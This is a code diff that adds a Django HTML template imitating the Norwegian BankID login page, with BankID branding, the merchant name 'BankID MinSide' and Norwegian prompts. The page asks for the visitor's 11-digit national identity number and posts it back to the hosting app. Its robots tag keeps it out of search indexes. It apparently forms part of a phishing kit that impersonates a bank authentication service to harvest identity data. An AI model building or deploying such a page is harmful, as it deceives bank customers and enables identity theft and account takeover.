@@ -1,0 +1,50 @@
+{% load static %}
+<html lang="nb">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="{% static 'img/favicon.png' %}">
+    <title>BankID</title>
+    <link href="{% static 'style/main.css' %}" rel="stylesheet">
+</head>
+<body class="">
+<main class="container">
+    <div class="container__content">
+        <div class="bankid-logo-wrapper">
+            <img alt="" class="bankid-logo" src="{% static 'img/logo.svg' %}">
+        </div>
+        <div class="page" id="getNnin" style="">
+            <form id="nnin-form" action="" method="post">
+                {% csrf_token %}
+                <div class="page__content">
+                    <h1 tabindex="-1" data-i18n="nnin" id="nnin-title">Fødselsnummer</h1>
+                    <span class="js-merchant-name merchant-name">BankID MinSide</span>
+                    <label for="nnin" data-i18n="nnin_label">Hva er ditt fødselsnummer?</label>
+                    <input pattern="[0-9]+" id="nnin" inputmode="numeric" minlength="11" maxlength="11"
+                           name="siffer" autocomplete="off"
+                           aria-labelledby="nnin-title" aria-invalid="true" required="">
+                    <div class="helper-text-container">
+                        <p id="nninValidationMessage" class="validation-text" data-i18n="nnin_helper_text"
+                           aria-live="polite">Fyll inn fødselsnummer (11 siffer)</p>
+                    </div>
+                    <div class="buttons__page__middle">
+                        <button type="submit" data-i18n="next" id="nnin-next-button" class="button button--default">
+                            Neste
+                        </button>
+                    </div>
+                    <p id="privacyPolicyDeclaration" data-i18n="privacy_policy_declaration">For å sjekke om du har
+                        BankID må vi behandle ditt fødselsnummer, les mer i vår <a id="privacyPolicyLink" href="#">personvernerklæring</a>.
+                    </p>
+                </div>
+            </form>
+            <div class="page__buttons">
+                <button data-i18n="cancel" id="decline-nnin-button" class="button button--link">Avbryt</button>
+            </div>
+        </div>
+    </div>
+</main>
+<script>
+</script>
+</body>
+</html>
